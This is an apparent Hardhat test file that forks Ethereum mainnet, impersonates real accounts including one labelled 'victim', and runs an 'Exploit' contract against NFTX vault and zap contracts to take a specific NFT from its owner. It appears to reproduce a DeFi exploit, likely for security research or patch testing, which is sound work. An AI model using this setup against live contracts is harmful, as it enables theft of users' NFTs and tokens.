const { expect } = require("chai");
const { expectRevert, expectException } = require("../../utils/expectRevert");

const { BigNumber } = require("@ethersproject/bignumber");
const { ethers, network } = require("hardhat");
const { utils } = ethers;
const { formatEther, parseEther } = utils;

const BASE = BigNumber.from(10).pow(18);

let zetsu, dao, newHolder, victim;
let factory, nft, phunkNft, coin, exploit;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

describe("Mainnet unstaking test ERC721", function () {
  before("Setup", async () => {
    await network.provider.request({
      method: "hardhat_reset",
      params: [
        {
          forking: {
            jsonRpcUrl: `https://eth-mainnet.alchemyapi.io/v2/${process.env.ALCHEMY_MAINNET_API_KEY}`,
            blockNumber: 15534058,
          },
        },
      ],
    });

    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: ["0xc6c2d5ee69745a1e9f2d1a06e0ef0788bd924302"],
    });
    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: ["0x40d73df4f99bae688ce3c23a01022224fe16c7b2"],
    });
    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: ["0xdDE05dA1122494C9aF1694B377aDbB43B47582C9"],
    });
    await hre.network.provider.request({
      method: "hardhat_impersonateAccount",
      params: ["0x4ffe2F674C4aFa078554cB2E5a6a672452B6c290"],
    });

    zetsu = await ethers.provider.getSigner("0xc6c2d5ee69745a1e9f2d1a06e0ef0788bd924302");
    dao = await ethers.provider.getSigner("0x40d73df4f99bae688ce3c23a01022224fe16c7b2");
    newHolder = await ethers.provider.getSigner("0xdDE05dA1122494C9aF1694B377aDbB43B47582C9");
    victim = await ethers.provider.getSigner("0x4ffe2F674C4aFa078554cB2E5a6a672452B6c290");

    factory = await ethers.getContractAt(
      "NFTXVaultFactoryUpgradeable",
      "0xBE86f647b167567525cCAAfcd6f881F1Ee558216"
    );

    nft = await ethers.getContractAt("IERC721Upgradeable", "0xbCe3781ae7Ca1a5e050Bd9C4c77369867eBc307e");
    phunkNft = await ethers.getContractAt("IERC721Upgradeable", "0xf07468eAd8cf26c752C676E43C814FEe9c8CF402");
    coin = await ethers.getContractAt("IERC20Upgradeable", "0xB39185e33E8c28e0BB3DbBCe24DA5dEA6379Ae91");

    await phunkNft.connect(victim).setApprovalForAll("0xbbc53022af15bb973ad906577c84784c47c14371", true);

    await zetsu.sendTransaction({
      to: newHolder._address,
      value: ethers.utils.parseEther("1"),
    });

    console.log("holder 1:", await nft.ownerOf(8160));
    await nft
      .connect(newHolder)
      .transferFrom(newHolder._address, "0x4ffe2F674C4aFa078554cB2E5a6a672452B6c290", 8160);

    console.log("holder 2:", await nft.ownerOf(8160));
  });

  it("Should deploy exploit", async () => {
    const Exploit = await ethers.getContractFactory("Exploit");
    exploit = await Exploit.deploy();
    await exploit.deployed();
  });

  // it("Should upgrade vault contract", async () => {
  //   await factory.connect(dao).upgradeChildTo("0x36b799160cdc2d9809d108224d1967cc9b7d321c");
  // });

  it("Should unpause vaults", async () => {
    await factory.connect(dao).unpause(1);
    await factory.connect(dao).unpause(2);
    await factory.connect(dao).unpause(3);
  });

  it("Should run exploit successfully", async () => {
    const router = await ethers.getContractAt("IUniswapV2Router01", "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F");

    // Buy PHUNK
    await router
      .connect(zetsu)
      .swapETHForExactTokens(
        utils.parseEther("2.1"),
        ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "0xB39185e33E8c28e0BB3DbBCe24DA5dEA6379Ae91"],
        zetsu._address,
        9999999999,
        { value: utils.parseEther("1") }
      );

    // Send some ETH to zap
    await zetsu.sendTransaction({
      to: exploit.address,
      value: ethers.utils.parseEther("1"),
    });
    // Send some PHUNK to zap
    await coin.connect(zetsu).transfer("0xbbc53022Af15Bb973AD906577c84784c47C14371", utils.parseEther("2"));

    const originOwner = await nft.ownerOf(8160);
    console.log("Original owner", originOwner);

    // Run exploit
    await exploit.connect(zetsu).exploit_buyAndSwap();

    const newOwner = await nft.ownerOf(8160);
    console.log("New owner", newOwner);
    // expect(newOwner).to.equal(exploit.address);
    // expect(newOwner).to.not.equal(originOwner);
  });

  // it("Should run exploit unsuccessfully", async () => {
  //   const router = await ethers.getContractAt("IUniswapV2Router01", "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F");

  //   // Buy JABBA
  //   await router
  //     .connect(zetsu)
  //     .swapETHForExactTokens(
  //       utils.parseEther("2.1"),
  //       ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "0x0CB8af226d28116f01C85324B0d920A6128178FB"],
  //       zetsu._address,
  //       9999999999,
  //       { value: utils.parseEther("0.5") }
  //     );

  //   // Send some ETH to zap
  //   await zetsu.sendTransaction({
  //     to: exploit.address,
  //     value: ethers.utils.parseEther("1"),
  //   });
  //   // Send some JABBA to zap
  //   await coin.connect(zetsu).transfer("0xbbc53022Af15Bb973AD906577c84784c47C14371", utils.parseEther("2"));

  //   const originOwner = await nft.ownerOf(8160);
  //   console.log("Original owner", originOwner);

  //   // Try running exploit
  //   await expectRevert(exploit.connect(zetsu).exploit_buyAndRedeem());

  //   const newOwner = await nft.ownerOf(8160);
  //   console.log("New owner", newOwner);
  //   expect(newOwner).to.equal(originOwner);
  // });

  // it("Should redeem normally", async () => {
  //   const uwuVault = await ethers.getContractAt(
  //     "NFTXVaultUpgradeable",
  //     "0x5cE188B44266c7B4bbC67Afa3D16b2eB24eD1065"
  //   );

  //   const xUwuAddr = "0x65879e73aecfc8a1cc7fe44a2ffb3392721e5652";
  //   const xUwuWethAddr = "0x3d76622e4bb64c32ddc034776236137695d5b9fd";

  //   let xUwuBalA = await uwuVault.balanceOf(xUwuAddr);
  //   let xUwuWethBalA = await uwuVault.balanceOf(xUwuWethAddr);

  //   await uwuVault.connect(zetsu).redeem(1, [9087]);

  //   let xUwuBalB = await uwuVault.balanceOf(xUwuAddr);
  //   let xUwuWethBalB = await uwuVault.balanceOf(xUwuWethAddr);

  //   let xUwuBalDif = xUwuBalB.sub(xUwuBalA);
  //   let xUwuWethBalDif = xUwuWethBalB.sub(xUwuWethBalA);

  //   expect(xUwuBalDif).to.equal(BASE.div(1000).mul(12));
  //   expect(xUwuWethBalDif).to.equal(BASE.div(1000).mul(48));

  //   console.log("xUwuBalDif", utils.formatEther(xUwuBalDif));
  // });

  // it("Should mint normally", async () => {
  //   const uwuVault = await ethers.getContractAt(
  //     "NFTXVaultUpgradeable",
  //     "0x5cE188B44266c7B4bbC67Afa3D16b2eB24eD1065"
  //   );
  //   const uwuNft = await ethers.getContractAt("IERC721Upgradeable", "0xf75140376d246d8b1e5b8a48e3f00772468b3c0c");

  //   const xUwuAddr = "0x65879e73aecfc8a1cc7fe44a2ffb3392721e5652";
  //   const xUwuWethAddr = "0x3d76622e4bb64c32ddc034776236137695d5b9fd";

  //   let xUwuBalA = await uwuVault.balanceOf(xUwuAddr);
  //   let xUwuWethBalA = await uwuVault.balanceOf(xUwuWethAddr);

  //   await uwuNft.connect(zetsu).setApprovalForAll(uwuVault.address, true);
  //   await uwuVault.connect(zetsu).mint([321], [1]);

  //   let xUwuBalB = await uwuVault.balanceOf(xUwuAddr);
  //   let xUwuWethBalB = await uwuVault.balanceOf(xUwuWethAddr);

  //   let xUwuBalDif = xUwuBalB.sub(xUwuBalA);
  //   let xUwuWethBalDif = xUwuWethBalB.sub(xUwuWethBalA);

  //   expect(xUwuBalDif).to.equal(BASE.div(1000).mul(20));
  //   expect(xUwuWethBalDif).to.equal(BASE.div(1000).mul(80));

  //   console.log("xUwuBalDif", utils.formatEther(xUwuBalDif));
  // });

  // it("Should swap normally", async () => {
  //   const uwuVault = await ethers.getContractAt(
  //     "NFTXVaultUpgradeable",
  //     "0x5cE188B44266c7B4bbC67Afa3D16b2eB24eD1065"
  //   );
  //   const uwuNft = await ethers.getContractAt("IERC721Upgradeable", "0xf75140376d246d8b1e5b8a48e3f00772468b3c0c");

  //   const xUwuAddr = "0x65879e73aecfc8a1cc7fe44a2ffb3392721e5652";
  //   const xUwuWethAddr = "0x3d76622e4bb64c32ddc034776236137695d5b9fd";

  //   let xUwuBalA = await uwuVault.balanceOf(xUwuAddr);
  //   let xUwuWethBalA = await uwuVault.balanceOf(xUwuWethAddr);

  //   await uwuVault.connect(zetsu).swap([118], [1], [9332]);

  //   let xUwuBalB = await uwuVault.balanceOf(xUwuAddr);
  //   let xUwuWethBalB = await uwuVault.balanceOf(xUwuWethAddr);

  //   let xUwuBalDif = xUwuBalB.sub(xUwuBalA);
  //   let xUwuWethBalDif = xUwuWethBalB.sub(xUwuWethBalA);

  //   expect(xUwuBalDif).to.equal(BASE.div(1000).mul(20));
  //   expect(xUwuWethBalDif).to.equal(BASE.div(1000).mul(80));

  //   console.log("xUwuBalDif", utils.formatEther(xUwuBalDif));
  // });
});
